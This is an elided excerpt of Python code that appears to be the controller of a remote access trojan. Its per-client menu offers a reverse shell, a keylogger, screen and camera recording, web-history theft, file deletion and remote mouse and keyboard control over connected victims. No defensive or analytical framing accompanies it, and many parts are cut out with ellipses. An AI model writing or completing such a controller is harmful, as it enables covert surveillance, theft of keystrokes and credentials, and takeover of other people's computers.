...
def mouse_control_loop(conn):
    while True:
        mouse_command = input("Enter command (e.g., move 100 200, press right, press left, double click left,roller up, roller down, exit to stop): ")
...
def receive_video_stream(host, port):
    ...
    def update_frame():
        try:
            ...
            frame = np.frombuffer(frame_data, dtype=np.uint8).reshape((480, 640, 3))  # Adjust shape as needed
        ...
        while not shutdown_flag.is_set():
            if selected_client == client_id:
                command = input("Enter command: \n"
                                "     M for start remote control keyboard\n"
                                "     S for stop remote control keyboard\n"
                                "     1 for screenshots\n"
                                "     2 for screen recording\n"
                                "     3 for camera recording\n"
                                "     4 for reverse shell\n"
                                "     5 for web history\n"
                                "     6 for start keylogger\n"
                                "     7 for stop keylogger\n"
                                "     8 for file delete\n"
                                "     9 for close\n"
                                "     10 for mouse control\n"
                                "     V for stream video\n"
        ...
        while not shutdown_flag.is_set():
            with clients_lock:
                ...
                for client_id in disconnected_clients:
                    ...
                    print(f"Client {client_id} connection is not alive.")
